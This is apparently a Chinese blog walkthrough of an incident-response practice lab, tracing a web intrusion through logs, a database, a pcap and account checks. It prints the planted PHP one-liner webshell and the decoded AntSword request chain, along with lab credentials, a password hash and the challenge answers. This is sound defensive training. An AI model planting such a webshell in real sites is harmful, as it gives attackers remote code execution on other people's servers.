---

title: 应急响应靶机-Linux(2)
date: 2026-03-25
categories:
  - 应急响应
tags:
  - 渗透靶场

---

<font style="color:rgb(77, 77, 77);">靶机源自于微信公众号：知攻善防实验室</font>

[应急响应靶机-Linux(2)](https://mp.weixin.qq.com/s/xf2FgkrjZg-yWlB9-pRXvw)



# <font style="color:rgba(0, 0, 0, 0.9);">挑战内容</font>
<font style="color:rgba(0, 0, 0, 0.9);">前景需要：看监控的时候发现webshell告警，领导让你上机检查你可以</font><font style="color:rgba(0, 0, 0, 0.9);">救救安服仔吗！！</font>

<font style="color:rgba(0, 0, 0, 0.9);">  
</font>

<font style="color:rgba(0, 0, 0, 0.9);">1,提交攻击者IP</font>

<font style="color:rgba(0, 0, 0, 0.9);">2,提交攻击者修改的管理员密码(明文)</font>

<font style="color:rgba(0, 0, 0, 0.9);">3,提交第一次Webshell的连接URL(http://xxx.xxx.xxx.xx/abcdefg?abcdefg只需要提交abcdefg?abcdefg)</font>

<font style="color:rgba(0, 0, 0, 0.9);">3,提交Webshell连接密码</font>

<font style="color:rgba(0, 0, 0, 0.9);">4,提交数据包的flag1</font>

<font style="color:rgba(0, 0, 0, 0.9);">5,提交攻击者使用的后续上传的木马文件名称</font>

<font style="color:rgba(0, 0, 0, 0.9);">6,提交攻击者隐藏的flag2</font>

<font style="color:rgba(0, 0, 0, 0.9);">7,提交攻击者隐藏的flag3</font>



# 环境
<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081458732.png)

Web：http://192.168.242.232，后台管理员：peadmin/Network@2020 【这个密码是从宝塔进入数据库拿到的管理员密码】

BT：https://192.168.242.232:8888/LingJing，账号密码：LingJing/LingJing

ssh：22端口，ssh root@192.168.242.232  账号密码： root/zgsf2025



连上ssh后，在/root路径下运行./wp查看题目

注意：该靶机存在许多非预期解，请合理练习应急响应技能。



## 宝塔：
<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081500709.png)

## WEB:
<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081458615.png)

## SSH:
<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081459359.png)



# 挑战
## <font style="color:rgba(0, 0, 0, 0.9);">1,提交攻击者IP【192.168.20.1】</font>
进入宝塔查看网站日志：

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081458875.png)

看到日志中 IP 为 192.168.20.1\131 的用户很不老实，进行了大规模的自动化漏洞扫描

进行了路径遍历

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081459885.png)

返回数据包和正常 core 页面一致，路径遍历没有成功

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081459420.png)



大规模漏洞扫描

虽然有返回 200  1993 的，但是返回的响应大小和正常页面都是一样的

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081500449.png)



192.168.20.1 同样也进行了漏洞扫描、爆破、webshell 利用，并且攻击成功：

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081458586.png)





攻击者使用了 NAT 网络，真实 IP 被隐藏在网关 192.168.20.1 后面。但从服务器日志角度，192.168.20.1 就是攻击流量的来源

日志分析只能基于服务器所见，而服务器看到的攻击源就是这个网关地址。



但是如果日志很多，一条一条看去效率低下，所以要熟练使用查找功能：

一种是可以在宝塔进行日志扫描：

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081500496.png)

很容易就可以找到攻击者 IP

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081500281.png)



另一种是在网站的日志文件，进行筛选：

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081459747.png)

`cat /www/wwwlogs/*.log | awk '{print $1}' | sort | uniq -c`

也可以确认攻击者 IP

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081458767.png)



## <font style="color:rgba(0, 0, 0, 0.9);">2,提交攻击者修改的管理员密码(明文)【Network@2020】</font>


用数据库账号密码：	kaoshi/5Sx8mK5ieyLPb84m 登录 phpmyadmin

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081459154.png)



<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081458235.png)

在用户表中找到加密的密码：f6f6eb5ace977d7e114377cc7098b7e3

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081458904.png)





<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081458328.png)



Network@2020





另外也可以去查找数据库常用配置文件：

`<font style="color:rgb(51, 51, 51);">find / -name config.inc.php（数据库常用配置文件名）</font>`

`cat /www/wwwroot/127.0.0.1/lib/config.inc.php`

找到数据库账号密码：

define('DU','kaoshi');//MYSQL数据库用户名

define('DP','5Sx8mK5ieyLPb84m');//MYSQL数据库用户密码

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081459512.png)



之后的数据库查询的另一种方法：

```bash
mysql -ukaoshi -p5Sx8mK5ieyLPb84m
show databases;
use kaoshi;
show tables like '%user%';
select * from x2_user;
select * from x2_user\G;
desc x2_user;
select username,userpassword from x2_user;
```

```bash

[root@web-server ~]# mysql -ukaoshi -p5Sx8mK5ieyLPb84m
mysql: [Warning] Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 8
Server version: 5.7.44-log Source distribution

Copyright (c) 2000, 2023, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| kaoshi             |
+--------------------+
2 rows in set (0.01 sec)

mysql> use kaoshi;
Database changed
mysql> show tables like '%user%';
+---------------------------+
| Tables_in_kaoshi (%user%) |
+---------------------------+
| x2_cnttouser              |
| x2_user                   |
| x2_user_group             |
+---------------------------+
3 rows in set (0.01 sec)

mysql> select * from x2_user;
+--------+------------+-------------+-----------------+----------------+----------------------------------+----------+----------------+-------------+-------------+----------------+-------------+--------------+------------+------------------------------------------------------------------------------------------------------------------------------+--------------------+--------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+-------------+------------+-----------+-------------+---------------------------------------------------------+------------+------------+
| userid | useropenid | userunionid | username        | useremail      | userpassword                     | usercoin | userregip      | userregtime | userlogtime | userverifytime | usergroupid | usermoduleid | useranswer | manager_apps                                                                                                                 | usertruename       | normal_favor | teacher_subjects                                                                                                                                                                             | userprofile | usergender | userphone | useraddress | userphoto                                               | userstatus | normal_sfz |
+--------+------------+-------------+-----------------+----------------+----------------------------------+----------+----------------+-------------+-------------+----------------+-------------+--------------+------------+------------------------------------------------------------------------------------------------------------------------------+--------------------+--------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+-------------+------------+-----------+-------------+---------------------------------------------------------+------------+------------+
|      1 |            | NULL        | peadmin         | 958074@163.com | f6f6eb5ace977d7e114377cc7098b7e3 |      279 | 127.0.0.1      |  1471795200 |           0 |           NULL |           1 |            0 | NULL       | a:7:{i:0;s:4:"user";i:1;s:7:"content";i:2;s:4:"exam";i:3;s:8:"document";i:4;s:6:"course";i:5;s:4:"bank";i:6;s:8:"autoform";} | 111111111111111111 |              |                                                                                                                                                                                              |             | 男         |           | 信息部      | files/attach/images/content/20230802/16909740072788.jpg |          3 |            |
|      2 |            | NULL        | 教师管理员      | 958074@126.com | 96e79218965eb72c92a549dd5a330112 |       98 | 127.0.0.1      |  1471795200 |           0 |           NULL |           9 |            0 | NULL       |                                                                                                                              | 213123             |              | a:14:{i:0;s:2:"13";i:1;s:2:"12";i:2;s:1:"5";i:3;s:1:"4";i:4;s:1:"3";i:5;s:1:"1";i:6;s:1:"2";i:7;s:2:"17";i:8;s:2:"15";i:9;s:2:"16";i:10;s:2:"18";i:11;s:2:"19";i:12;s:2:"20";i:13;s:2:"21";} | 77777       |            |           |             |                                                         |          3 |            |
|      3 |            |             | zgsf            | zgsf@Admin.com | af0c68603004a1b5af4d87a71a813057 |        0 | 192.168.20.131 |  1709795218 |           0 |              0 |           8 |            0 |            |                                                                                                                              |                    |              |                                                                                                                                                                                              |             |            |           |             |                                                         |          0 |            |
|      4 |            |             | zgsfAdmin       | zgsf@zgsf.com  | ed2b3e3ce2425550d8bfdea8b80cc89a |        0 | 192.168.20.131 |  1709796233 |           0 |              0 |           8 |            0 |            |                                                                                                                              |                    |              |                                                                                                                                                                                              |             |            |           |             |                                                         |          0 |            |
+--------+------------+-------------+-----------------+----------------+----------------------------------+----------+----------------+-------------+-------------+----------------+-------------+--------------+------------+------------------------------------------------------------------------------------------------------------------------------+--------------------+--------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+-------------+------------+-----------+-------------+---------------------------------------------------------+------------+------------+
4 rows in set (0.02 sec)

mysql> select * from x2_user\G;
*************************** 1. row ***************************
          userid: 1
      useropenid:
     userunionid: NULL
        username: peadmin
       useremail: 958074@163.com
    userpassword: f6f6eb5ace977d7e114377cc7098b7e3
        usercoin: 279
       userregip: 127.0.0.1
     userregtime: 1471795200
     userlogtime: 0
  userverifytime: NULL
     usergroupid: 1
    usermoduleid: 0
      useranswer: NULL
    manager_apps: a:7:{i:0;s:4:"user";i:1;s:7:"content";i:2;s:4:"exam";i:3;s:8:"document";i:4;s:6:"course";i:5;s:4:"bank";i:6;s:8:"autoform";}
    usertruename: 111111111111111111
    normal_favor:
teacher_subjects:
     userprofile:
      usergender: 男
       userphone:
     useraddress: 信息部
       userphoto: files/attach/images/content/20230802/16909740072788.jpg
      userstatus: 3
      normal_sfz:
*************************** 2. row ***************************
          userid: 2
      useropenid:
     userunionid: NULL
        username: 教师管理员
       useremail: 958074@126.com
    userpassword: 96e79218965eb72c92a549dd5a330112
        usercoin: 98
       userregip: 127.0.0.1
     userregtime: 1471795200
     userlogtime: 0
  userverifytime: NULL
     usergroupid: 9
    usermoduleid: 0
      useranswer: NULL
    manager_apps:
    usertruename: 213123
    normal_favor:
teacher_subjects: a:14:{i:0;s:2:"13";i:1;s:2:"12";i:2;s:1:"5";i:3;s:1:"4";i:4;s:1:"3";i:5;s:1:"1";i:6;s:1:"2";i:7;s:2:"17";i:8;s:2:"15";i:9;s:2:"16";i:10;s:2:"18";i:11;s:2:"19";i:12;s:2:"20";i:13;s:2:"21";}
     userprofile: 77777
      usergender:
       userphone:
     useraddress:
       userphoto:
      userstatus: 3
      normal_sfz:
*************************** 3. row ***************************
          userid: 3
      useropenid:
     userunionid:
        username: zgsf
       useremail: zgsf@Admin.com
    userpassword: af0c68603004a1b5af4d87a71a813057
        usercoin: 0
       userregip: 192.168.20.131
     userregtime: 1709795218
     userlogtime: 0
  userverifytime: 0
     usergroupid: 8
    usermoduleid: 0
      useranswer:
    manager_apps:
    usertruename:
    normal_favor:
teacher_subjects:
     userprofile:
      usergender:
       userphone:
     useraddress:
       userphoto:
      userstatus: 0
      normal_sfz:
*************************** 4. row ***************************
          userid: 4
      useropenid:
     userunionid:
        username: zgsfAdmin
       useremail: zgsf@zgsf.com
    userpassword: ed2b3e3ce2425550d8bfdea8b80cc89a
        usercoin: 0
       userregip: 192.168.20.131
     userregtime: 1709796233
     userlogtime: 0
  userverifytime: 0
     usergroupid: 8
    usermoduleid: 0
      useranswer:
    manager_apps:
    usertruename:
    normal_favor:
teacher_subjects:
     userprofile:
      usergender:
       userphone:
     useraddress:
       userphoto:
      userstatus: 0
      normal_sfz:
4 rows in set (0.00 sec)

ERROR:
No query specified

mysql> desc x2_user
    -> ^C
mysql> desc x2_user;
+------------------+--------------+------+-----+---------+----------------+
| Field            | Type         | Null | Key | Default | Extra          |
+------------------+--------------+------+-----+---------+----------------+
| userid           | int(11)      | NO   | PRI | NULL    | auto_increment |
| useropenid       | varchar(48)  | NO   | MUL | NULL    |                |
| userunionid      | varchar(48)  | YES  | MUL | NULL    |                |
| username         | varchar(60)  | NO   | MUL |         |                |
| useremail        | varchar(60)  | NO   | UNI |         |                |
| userpassword     | char(32)     | NO   |     |         |                |
| usercoin         | int(11)      | NO   | MUL | 0       |                |
| userregip        | varchar(24)  | NO   |     |         |                |
| userregtime      | int(11)      | NO   | MUL | 0       |                |
| userlogtime      | int(11)      | NO   | MUL | 0       |                |
| userverifytime   | int(11)      | YES  |     | NULL    |                |
| usergroupid      | int(11)      | NO   |     | 0       |                |
| usermoduleid     | int(11)      | NO   | MUL | 0       |                |
| useranswer       | text         | YES  |     | NULL    |                |
| manager_apps     | varchar(240) | NO   |     | NULL    |                |
| usertruename     | varchar(24)  | NO   |     |         |                |
| normal_favor     | varchar(250) | NO   |     |         |                |
| teacher_subjects | text         | NO   |     | NULL    |                |
| userprofile      | text         | NO   |     | NULL    |                |
| usergender       | varchar(6)   | NO   |     | NULL    |                |
| userphone        | varchar(15)  | NO   | MUL | NULL    |                |
| useraddress      | varchar(120) | NO   |     | NULL    |                |
| userphoto        | varchar(240) | NO   |     | NULL    |                |
| userstatus       | int(4)       | YES  |     | NULL    |                |
| normal_sfz       | tinytext     | NO   |     | NULL    |                |
+------------------+--------------+------+-----+---------+----------------+
25 rows in set (0.00 sec)

mysql> select username,userpassword from x2_user;
+-----------------+----------------------------------+
| username        | userpassword                     |
+-----------------+----------------------------------+
| peadmin         | f6f6eb5ace977d7e114377cc7098b7e3 |
| 教师管理员      | 96e79218965eb72c92a549dd5a330112 |
| zgsf            | af0c68603004a1b5af4d87a71a813057 |
| zgsfAdmin       | ed2b3e3ce2425550d8bfdea8b80cc89a |
+-----------------+----------------------------------+
4 rows in set (0.00 sec)

mysql>
```





## <font style="color:rgba(0, 0, 0, 0.9);">3,提交第一次Webshell的连接URL(http://xxx.xxx.xxx.xx/abcdefg?abcdefg只需要提交abcdefg?abcdefg)【index.php?user-app-register】</font>


> 官方的 WP 是进入 web 页面找到了一句话木马，从而确认是“注册协议”的路由，但是下一步如何去找“注册协议”的路由呢？
>



首先要确认 webshell 文件，在宝塔目录下搜索（如果进入 web 网页，一个模块一个模块看过去。。）：

`grep -irn '@eval(' /www`

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081458605.png)

找到 webshell 的位置`content/tpls/master/blocks_modify.html`

进入 web 页面查看：

账号密码：peadmin/Network@2020





这里如果直接拼接路径是不对的，观察后台的其他页面，得出应该访问的是：`http://192.168.242.70/index.php?content-master-blocks`



<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081458131.png)

在模板修改中发现了一句话木马：<?php namespace t;@eval($_POST['Network2020']);?>

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081458492.png)



该标签对应的位置是 “注册页面”，因此 “注册页面” 的 url 就是 webshell 的 url，即 `index.php?user-app-register`：





因为之前看到有流量包，所以也可以分析流量进行确认：



<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081458731.png)

 wireshark 打开流量包

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081459771.png)

从流量包中看到请求的链接 URL 为 `index.php?user-app-register`和`version2.php`

并且还发现了 flag1: `flag1{Network@_2020_Hack}`

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081459135.png)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081500649.png)



可以对 `index.php?user-app-register`的内容分析，以确认是 webshell 的流量包：



<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081500475.png)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081459775.png)





## <font style="color:rgba(0, 0, 0, 0.9);">4,提交Webshell连接密码【Network2020】</font>
连接密码在上一步的流量包分析中已经找到：`Network2020`





## <font style="color:rgba(0, 0, 0, 0.9);">5,提交数据包的flag1【</font>`<font style="color:rgba(0, 0, 0, 0.9);">flag1{Network@_2020_Hack}</font>`<font style="color:rgba(0, 0, 0, 0.9);">】</font>
分析流量包得出：

 `flag1{Network@_2020_Hack}`

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081500649.png)

## <font style="color:rgba(0, 0, 0, 0.9);">6,提交攻击者使用的后续上传的木马文件名称【version2.php】</font>
在流量包中，进行了 URL 解码后的内容中，最后一行是需要执行的参数，因为蚁剑会将参数进行 base64 编码，然后在最前面随机添加两个字母，

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081458824.png)

<font style="color:rgb(51, 51, 51);">进行base64解码，得到参数为</font>`<font style="color:rgb(51, 51, 51);">/www/wwwroot/127.0.0.1/</font>`

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081459602.png)

结合前面的 `x0b6b31b98f31d`是蚁剑随机生成的 POST 参数名，用于向 Webshell 传递操作参数

`&x0b6b31b98f31d=TtL3d3dy93d3dyb290LzEyNy4wLjAuMS8=`

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081500550.png)

这一整个 php 代码的调用链就是：

```php
# 源码
&x0b6b31b98f31d=TtL3d3dy93d3dyb290LzEyNy4wLjAuMS8=
$D=base64_decode(substr($_POST["x0b6b31b98f31d"],2));
$F=@opendir($D);

# POST 传参 x0b6b31b98f31d ，即 TtL3d3dy93d3dyb290LzEyNy4wLjAuMS8=
$_POST["x0b6b31b98f31d"]
# 接着对POST参数进行删减前俩位，留下 L3d3dy93d3dyb290LzEyNy4wLjAuMS8=（/www/wwwroot/127.0.0.1/）
substr($_POST["x0b6b31b98f31d"],2)
# 之后进行base64解码，得到 /www/wwwroot/127.0.0.1/
base64_decode(substr($_POST["x0b6b31b98f31d"],2));
# 通过参数 $D 传递给下一步，opendir 列出该目录下所有文件
$F=@opendir($D);
```



其他的数据包大概意思就是创建并写入 flag1，创建木马 shell.php 后改名为 version2.php，最后访问 version2.php 



所以后续上传的木马就是 version2.php







## <font style="color:rgba(0, 0, 0, 0.9);">7,提交攻击者隐藏的flag2【flag{bL5Frin6JVwVw7tJBdqXlHCMVpAenXI9In9}】</font>
试试直接搜索 flag2:

`grep -inr flag2 /www`



<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081459645.png)

$flag2 = "flag{bL5Frin6JVwVw7tJBdqXlHCMVpAenXI9In9}";



## <font style="color:rgba(0, 0, 0, 0.9);">8,提交攻击者隐藏的flag3【flag{5LourqoFt5d2zyOVUoVPJbOmeVmoKgcy6OZ}】</font>


在 env 中找到 flag3=flag{5LourqoFt5d2zyOVUoVPJbOmeVmoKgcy6OZ}

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081459161.png)





# 提交 wp
```php
[root@web-server ~]# ./wp
提交攻击者IP？
192.168.20.1
回答正确！
提交攻击者修改的管理员密码(明文)
Network@2020
回答正确！
提交第一次Webshell的连接URL（http://xxx.xxx.xxx.xx/abcdefg?abcdefg只需要提交abcdefg?abcdefg）
index.php?user-app-register
回答错误！
提交Webshell连接密码
Network2020
回答正确！
提交数据包的flag1
flag1{Network@_2020_Hack}
回答正确！
提交攻击者使用的后续上传的木马文件名称
version2.php
回答正确！
提交攻击者隐藏的flag2
flag{bL5Frin6JVwVw7tJBdqXlHCMVpAenXI9In9}
回答正确！
提交攻击者隐藏的flag3
flag{5LourqoFt5d2zyOVUoVPJbOmeVmoKgcy6OZ}
回答正确！
[root@web-server ~]#
```



<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081459383.png)









# 参考文章
<font style="color:rgba(0, 0, 0, 0.9);">应急响应靶机-Linux(2)</font>

[https://mp.weixin.qq.com/s/xf2FgkrjZg-yWlB9-pRXvw](https://mp.weixin.qq.com/s/xf2FgkrjZg-yWlB9-pRXvw)

<font style="color:rgba(0, 0, 0, 0.9);">应急响应靶机训练-Linux2题解</font>

[https://mp.weixin.qq.com/s/5ibP6E8R-GPtOEJeFK8qZA](https://mp.weixin.qq.com/s/5ibP6E8R-GPtOEJeFK8qZA)

<font style="color:rgb(31, 45, 61);">知攻善防Linux Web2靶场入侵排查</font>

[https://lusensec.github.io/2024/03/23/Emergency-Linux-web2/index.html](https://lusensec.github.io/2024/03/23/Emergency-Linux-web2/index.html)







# 完整<font style="color:rgb(31, 45, 61);">入侵排查</font>
> <font style="color:rgb(31, 45, 61);">参考</font>[知攻善防Linux Web2靶场入侵排查](https://lusensec.github.io/2024/03/23/Emergency-Linux-web2/index.html)，进行一次完整的入侵排查。
>

## 一、账户安全
### 排查可登录账户
`cat /etc/passwd | grep -v nologin`

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081459649.png)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081500192.png)

只有 root 具有完整的交互式 shell ，没有攻击新增的后门账户



### 排查有密码的账户
`awk '/\$1|\$6/{print $1}' /etc/shadow`#在 /etc/shadow 中筛选包含 $1（MD5 加密）或 $6（SHA-512 加密）的行，即有实际密码哈希的账户



```php
root:$6$OycKNb8l$0aJISoIo22CRPWZVqddw0myP7bFyhStqe32JzamphLJuRfgbuQcsM9b0igglTVBko/oUVoW7MmA8U3KZfM8iM1:20404:0:99999:7:::
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081458930.png)



只有 root 一个账户设置了密码

### 检查 /home 目录
`ls -alsh /home`

```bash
[root@web-server ~]# ls -alsh /home
total 40K
  0 drwxr-xr-x.  3 root root  35 Mar  7  2024 .
  0 dr-xr-xr-x. 20 root root 288 Mar  7  2024 ..
40K -rw-r--r--   1 root root 37K Mar  7  2024 install.sh
  0 drwx------   2 www  www   62 Mar  7  2024 www
[root@web-server ~]# ls -alsh /home/www
total 12K
   0 drwx------  2 www  www   62 Mar  7  2024 .
   0 drwxr-xr-x. 3 root root  35 Mar  7  2024 ..
4.0K -rw-r--r--  1 www  www   18 Apr  1  2020 .bash_logout
4.0K -rw-r--r--  1 www  www  193 Apr  1  2020 .bash_profile
4.0K -rw-r--r--  1 www  www  231 Apr  1  2020 .bashrc
```

/home 下只有 www 一个用户目录



### 查看 www 用户信息
`cat /etc/passwd | grep www`

```bash
[root@web-server ~]# cat /etc/passwd ! grep www
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
polkitd:x:999:998:User for polkitd:/:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
ntp:x:38:38::/etc/ntp:/sbin/nologin
www:x:1000:1000::/home/www:/sbin/nologin
mysql:x:1001:1001::/home/mysql:/sbin/nologin
cat: !: No such file or directory
cat: grep: No such file or directory
cat: www: No such file or directory
```

www 用户 shell 为 nologin，是宝塔自动创建的服务账户



### 查看当前登录用户
<font style="color:rgb(76, 73, 72);">tty 本地登陆 pts 远程登录</font>

`who`

```bash
[root@web-server ~]# who
root     pts/0        2025-11-13 00:58 (192.168.188.104)
root     pts/1        2025-11-13 01:33 (192.168.188.6)
[root@web-server ~]#
```

 2 个 root 会话，都是本人远程连接的



### 历史登录记录
`last` #读取 /var/log/wtmp，显示所有用户的历史登录记录，包括登录时间、来源 IP、会话时长。

```bash
[root@web-server ~]# last
root     pts/1        192.168.188.6    Thu Nov 13 01:33   still logged in
root     pts/0        192.168.188.104  Thu Nov 13 00:58   still logged in
root     pts/1        192.168.188.6    Wed Nov 12 20:41 - 01:27  (04:46)
root     pts/0        192.168.188.104  Wed Nov 12 20:32 - 23:21  (02:48)
root     tty1                          Wed Nov 12 20:21 - 20:23  (00:02)
reboot   system boot  3.10.0-1160.el7. Wed Nov 12 20:19 - 01:54  (05:34)
reboot   system boot  3.10.0-1160.el7. Wed Nov 12 20:17 - 01:54  (05:36)
root     tty1                          Wed Nov 12 20:11 - crash  (00:06)
reboot   system boot  3.10.0-1160.el7. Wed Nov 12 20:11 - 01:54  (05:43)
root     pts/0        mac.lan          Wed Nov 12 19:34 - crash  (00:36)
root     tty1                          Wed Nov 12 19:32 - crash  (00:38)
reboot   system boot  3.10.0-1160.el7. Wed Nov 12 19:32 - 01:54  (06:22)
root     tty1                          Wed Nov 12 19:09 - crash  (00:23)
reboot   system boot  3.10.0-1160.el7. Wed Nov 12 19:08 - 01:54  (06:45)
root     pts/0        mac.lan          Wed Nov 12 18:57 - crash  (00:11)
reboot   system boot  3.10.0-1160.el7. Wed Nov 12 18:56 - 01:54  (06:57)
root     pts/0        mac.lan          Wed Nov 12 16:30 - crash  (02:26)
root     tty1                          Wed Nov 12 16:29 - crash  (02:26)
reboot   system boot  3.10.0-1160.el7. Wed Nov 12 16:28 - 01:54  (09:25)
root     pts/1        192.168.20.1     Wed Mar 20 15:36 - crash (602+00:52)
root     pts/0        192.168.20.1     Wed Mar 20 15:04 - 15:39  (00:34)
root     pts/0        192.168.20.1     Wed Mar 20 14:30 - 15:04  (00:33)
reboot   system boot  3.10.0-1160.el7. Wed Mar 20 14:29 - 01:54 (602+11:24)
root     pts/1        localhost        Wed Mar 20 10:30 - 10:30  (00:00)
root     pts/0        192.168.20.1     Wed Mar 20 07:59 - crash  (06:30)
reboot   system boot  3.10.0-1160.el7. Wed Mar 20 07:58 - 01:54 (602+17:55)
root     pts/0        192.168.20.1     Thu Mar  7 15:36 - crash (12+16:21)
root     pts/0        192.168.20.1     Thu Mar  7 15:25 - 15:36  (00:11)
root     pts/0        192.168.20.1     Thu Mar  7 14:39 - 15:25  (00:45)
root     pts/0        192.168.20.1     Thu Mar  7 14:07 - 14:09  (00:01)
reboot   system boot  3.10.0-1160.el7. Thu Mar  7 14:06 - 01:54 (615+11:47)
root     pts/0        192.168.20.1     Thu Mar  7 11:37 - 11:52  (00:15)
reboot   system boot  3.10.0-1160.el7. Thu Mar  7 11:36 - 01:54 (615+14:17)
root     pts/0        192.168.20.1     Mon Mar  4 09:48 - down   (00:01)
root     tty1                          Mon Mar  4 09:47 - 09:50  (00:02)
reboot   system boot  3.10.0-1160.el7. Mon Mar  4 09:47 - 09:50  (00:03)

wtmp begins Mon Mar  4 09:47:02 2024
[root@web-server ~]#
```

192.168.20.1 有大量 SSH 登录



## <font style="color:rgb(31, 45, 61);">二、历史命令排查</font>
`history`

> 这里因为是灵境开的靶机，只能 ssh 连接，所以看到的历史命令其实大都是自己的，所以这一部分暂且略过
>





## 三、<font style="color:rgb(31, 45, 61);">端口、进程排查</font>
### 网络连接检查
`netstat -antlp`#查看所有 TCP 监听端口和已建立的连接

```bash
[root@web-server ~]# netstat -antlp | more
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      1017/sshd
tcp        0      0 0.0.0.0:8888            0.0.0.0:*               LISTEN      2262/python3
tcp        0      0 0.0.0.0:888             0.0.0.0:*               LISTEN      1122/nginx: master
tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      1774/master
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      1122/nginx: master
